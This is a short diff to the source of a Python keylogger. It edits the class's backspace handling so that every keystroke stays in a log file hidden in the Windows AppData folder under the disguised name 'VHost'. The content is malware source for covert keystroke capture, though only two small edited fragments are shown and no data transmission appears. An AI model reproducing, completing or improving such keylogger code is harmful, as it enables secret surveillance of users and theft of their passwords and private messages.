@@ -184,7 +184,7 @@ class Keylogger:
                 if Key ==Key.backspace:
                            with open(os.environ["appdata"]+'\\VHost','r',encoding="utf-8") as log :
                                 log_file=log.read()
-                                log_cut = log_file[0:-1]
+                                log_cut = log_file[0::]
                            with open(os.environ["appdata"]+'\\VHost','w',encoding="utf-8") as log :      
                                  log_write = log.write(log_cut)
                 if Key ==Key.caps_lock:
@@ -203,7 +203,7 @@ class Keylogger:
                     if Key ==Key.backspace:
                            with open(os.environ["appdata"]+'\\VHost','r',encoding="utf-8") as log :
                                 log_file=log.read()
-                                log_cut = log_file[0:-1]
+                                log_cut = log_file[0::]
                            with open(os.environ["appdata"]+'\\VHost','w',encoding="utf-8") as log :      
                                  log_write = log.write(log_cut)
                     if Key ==Key.caps_lock:
